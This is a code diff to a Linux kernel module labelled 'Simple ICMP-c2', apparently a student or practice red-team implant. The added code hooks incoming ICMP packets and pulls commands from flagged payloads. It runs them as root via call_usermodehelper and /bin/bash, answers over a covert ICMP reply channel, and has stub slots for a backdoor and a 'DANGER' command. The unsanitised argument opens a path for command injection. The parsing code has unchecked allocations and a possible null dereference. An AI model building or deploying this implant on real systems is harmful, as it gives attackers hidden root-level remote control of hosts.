@@ -14,6 +14,8 @@
 #include <linux/if_ether.h>
 #include <net/ip.h>
 
+#define DEBUG_K
+
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("jackdunf@buffalo.edu");
 MODULE_DESCRIPTION("Simple ICMP-c2");
@@ -27,9 +29,139 @@ MODULE_DESCRIPTION("Simple ICMP-c2");
 
 static struct socket *raw_socket;
 static struct nf_hook_ops nfho;
+
+typedef enum COMMANDS {
+    START_SERVICE = 0,
+    STOP_SERVICE  = 1,
+    OPEN_BACKDOOR = 2,
+    DANGER        = 4
+} command_t;
+
+// Commands
+static int execute_and_get_status(command_t type, char *argument);
+char **split_on_strings(char *string, int *token_count);
+void free_tokens(char **tokens, int token_count);
+int parse_and_run_command(char *raw_input);
+// Networking
 unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);
 static uint16_t checksum(uint16_t *data, int len);
-static int send_icmp_echo_request(struct icmphdr *incoming_icmp, __be32 address, char *payload, size_t payload_len);
+static int send_icmp_reply(struct icmphdr *incoming_icmp, __be32 address, char *payload, size_t payload_len);
+
+
+static int execute_and_get_status(command_t type, char *argument){
+    char command[128] = {0};
+    int ret;
+
+    
+    switch(type){
+        case START_SERVICE:
+        case STOP_SERVICE:
+            #ifdef DEBUG_K
+                pr_info("PRAC: %sing service %s\n", type == START_SERVICE ? "start" : "stop", argument);
+            #endif
+            snprintf(command, 127, "systemctl %s %s", type == START_SERVICE ? "start" : "stop", argument);
+            break;
+        case OPEN_BACKDOOR:
+            #ifdef DEBUG_K
+                pr_err("OPEN_BACKDOOR: Not yet implemented");
+            #endif
+            return -1;
+        case DANGER:
+            #ifdef DEBUG_K
+                pr_err("DANGER: Not yet implemented");
+            #endif
+            return -1;
+        default:
+            #ifdef DEBUG_K
+                pr_err("Invalid Command Type: %d\n", type);
+            #endif
+            return -1;
+    }
+    
+    char *argv[] = { "/bin/bash", "-c", command, NULL };
+    char *envp[] = { "HOME=/", "TERM=xterm", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
+    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    if (ret != 0){
+        #ifdef DEBUG_K
+            pr_err("Error (%d) executing command: \"%s\"\n", ret, command);
+        #endif
+    }
+
+    return ret;
+}
+
+char **split_on_strings(char *string, int *token_count){
+	int size = 5;
+	char **output = (char **) kmalloc(size * sizeof(char *), GFP_KERNEL); // init alloc
+	char *current_char = string;
+	char *past = string;
+	int i = 0;
+
+	int keep_going = 1;
+	// Loop until split
+	while (keep_going){
+		int current_size;
+		while(*current_char != ' ' && *current_char != 0) ++current_char;
+		if(*current_char == 0)
+			keep_going = 0;
+
+		if (i >= size)
+			output = krealloc(output, (size += 3) * sizeof(char *), GFP_KERNEL);
+            // TODO: add error handling
+
+		current_size = current_char - past;
+		char *current_block = (char *) kmalloc(current_size + 1, GFP_KERNEL);
+		memcpy(current_block, past, current_size);
+		current_block[current_size] = 0;
+		output[i++] = current_block;
+		past = ++current_char;
+	}
+
+	*token_count = i;
+	return output;
+}
+
+void free_tokens(char **tokens, int token_count){
+	for(int i = 0; i < token_count; i++){
+		kfree(tokens[i]);
+	}
+	kfree(tokens);
+}
+
+// Returns status
+int parse_and_run_command(char *raw_input){
+    char **argv_in;
+    int argc_in;
+    command_t type;
+    int status = 0;
+
+    argv_in = split_on_strings(raw_input, &argc_in);
+    #ifdef DEBUG_K
+        pr_info("Count: %d\n", argc_in);
+        for(int i = 0; i < argc_in; i++){
+            pr_info("Token %d: %s\n", i+1, argv_in[i]);
+        }
+    #endif
+
+    if(strncmp(argv_in[0], "START_SERVICE", 13) == 0){
+        type = START_SERVICE;
+    } else if(strncmp(argv_in[0], "STOP_SERVICE", 12) == 0){
+        type = STOP_SERVICE;
+    } else {
+        type = DANGER;
+    }
+
+    #ifdef DEBUG_K
+        pr_info("Type: %d\n", type);
+    #endif
+
+    // Only takes second word rn
+    status = execute_and_get_status(type, argv_in[1]);
+
+    free_tokens(argv_in, argc_in);
+    return status;
+}
+
 // Source: elsewhere
 static uint16_t checksum(uint16_t *data, int len) {
     uint32_t sum = 0;
@@ -41,7 +173,7 @@ static uint16_t checksum(uint16_t *data, int len) {
 }
 
 // Source: jackdunf, different file
-static int send_icmp_echo_request(struct icmphdr *incoming_icmp, __be32 address, char *payload, size_t payload_len) {
+static int send_icmp_reply(struct icmphdr *incoming_icmp, __be32 address, char *payload, size_t payload_len) {
     struct sockaddr_in dest_addr;
     struct msghdr msg = {};
     struct kvec iov;
@@ -147,8 +279,14 @@ unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_s
         pr_info("Payload contained flag\n");
     #endif
 
+    char *command = payload+FLAG_LEN;
+    int status = parse_and_run_command(command);
+    #ifdef DEBUG_K
+        pr_info("Status: %d\n", status);
+    #endif
+
     // TODO: Check if ignore all is set
-    if(send_icmp_echo_request(icmph, iph->saddr, payload, icmp_payload_len) < 0){
+    if(send_icmp_reply(icmph, iph->saddr, payload, icmp_payload_len) < 0){
         return NF_ACCEPT;
     }
     return NF_DROP;
